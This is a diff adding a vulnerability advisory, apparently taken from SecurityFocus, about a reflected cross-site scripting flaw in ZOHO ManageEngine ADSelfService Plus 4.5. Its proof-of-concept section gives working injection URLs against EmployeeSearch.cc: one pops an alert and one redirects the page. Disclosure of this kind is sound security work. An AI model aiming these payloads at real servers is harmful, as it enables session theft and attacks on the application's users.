@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/50717/info
+
+ZOHO ManageEngine ADSelfService Plus is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+ManageEngine ADSelfService Plus 4.5 Build 4521 is vulnerable; other versions may also be affected. 
+
+Proof of Concept
+===================
+Double-Quote String Termination
+HTTP Request =
+https://serverip:port/EmployeeSearch.cc?searchType=contains&searchBy=ALL_FIELDS&searchString=";alert("XSS");//\"
+
+Response Source View
+<script language="javascript">
+var searchValue = "';alert(XSS)//\"";
+
+
+Single-Quote String Termination
+Similarly...
+HTTP Request
+https://serverip:port/EmployeeSearch.cc?searchType=';document.location="http://www.cnn.com";//\"&searchBy=ALL_FIELDS&searchString=BoB
